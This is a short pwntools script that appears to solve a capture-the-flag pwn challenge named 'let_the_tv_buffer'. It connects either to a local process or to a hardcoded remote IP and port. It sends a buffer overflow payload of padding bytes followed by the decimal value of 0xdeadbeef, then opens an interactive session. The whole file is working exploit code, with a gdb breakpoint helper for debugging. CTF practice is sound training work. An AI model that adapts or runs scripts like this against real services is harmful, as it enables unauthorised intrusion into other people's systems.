from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./let_the_tv_buffer"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("43.205.113.100", 8705)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b"a"*0x12
payload += b"3735928559"
# payload += b"\x33\x37\x33\x35\x39\x32\x38\x35\x35\x39"


ddebug("breakrva 0x0123E\ncontinue")
io.sendlineafter("as? \nReply >> ", payload)
io.interactive()
